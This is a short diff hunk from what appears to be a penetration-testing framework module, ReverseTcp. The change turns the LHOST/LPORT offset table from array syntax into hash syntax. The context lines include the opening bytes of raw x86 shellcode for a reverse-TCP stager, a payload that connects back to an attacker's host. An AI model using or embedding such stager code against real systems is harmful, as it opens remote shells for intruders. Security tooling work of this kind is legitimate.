@@ -24,10 +24,10 @@ module ReverseTcp
 			'StagerPayload' =>
 				{
 					'Offsets' =>
-						[
+						{
 							'LHOST' => [ 221, 'ADDR' ],
 							'LPORT' => [ 228, 'n'    ],
-						],
+						},
 					'Payload' =>
 						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c" +
 						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32" +
